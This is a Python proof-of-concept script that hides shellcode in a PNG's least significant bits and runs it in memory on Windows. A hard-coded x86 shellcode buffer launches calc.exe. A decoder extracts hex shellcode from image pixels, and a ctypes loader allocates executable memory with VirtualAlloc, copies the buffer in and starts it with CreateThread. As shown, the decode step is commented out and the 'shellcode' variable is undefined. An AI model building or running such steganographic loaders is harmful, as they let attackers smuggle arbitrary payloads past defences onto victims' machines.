from PIL import Image
import ctypes
import binascii


buf = ""
buf += "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
buf += "\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
buf += "\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
buf += "\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
buf += "\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
buf += "\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
buf += "\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
buf += "\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
buf += "\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
buf += "\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
buf += "\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
buf += "\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
buf += "\x52\xff\xd0"



def binary_to_text(binary_data):
    # Convert binary data to text format
    return ''.join(chr(int(binary_data[i:i+8], 2)) for i in range(0, len(binary_data), 8))

def decode_lsb(encoded_image_path):
    encoded_image = Image.open(encoded_image_path)
    
    # Convert the image to RGB mode (if it's not already)
    encoded_image = encoded_image.convert("RGB")

    width, height = encoded_image.size
    binary_data = ""

    # Extract binary data from the least significant bits of the pixels
    for y in range(height):
        for x in range(width):
            pixel = encoded_image.getpixel((x, y))
            for channel in range(3):  # 3 channels (RGB)
                # Extract the least significant bit and append to binary data
                binary_data += format(pixel[channel] & 1, '01')

    # Find the index of the null character '\0' to mark the end of the data
    end_index = binary_data.find("00000000")
    binary_data = binary_data[:end_index]
    print(binary_data)
    plaintext_data = binary_to_text(binary_data)
    print(type(plaintext_data))

    if plaintext_data[-1:] != '"':
        bad_char = plaintext_data[-1:]
        plaintext_data = plaintext_data.replace(bad_char, '"')
    hex_array = plaintext_data.split('"')
    buf = b''
    for i in hex_array:
        if i != '':
            buf += f'{i}'.encode()

    return buf 



# Example usage:
if __name__ == "__main__":
    encoded_image_path = "poc_example.png"
    #shellcode_str = decode_lsb(encoded_image_path)
    
    #shellcode = binascii.unhexlify(shellcode_str.decode().replace('\\x', ''))

    #print(bytes_object)
    #print(type(bytes_object))

    #shellcode = bytearray()

    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
 
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1)) 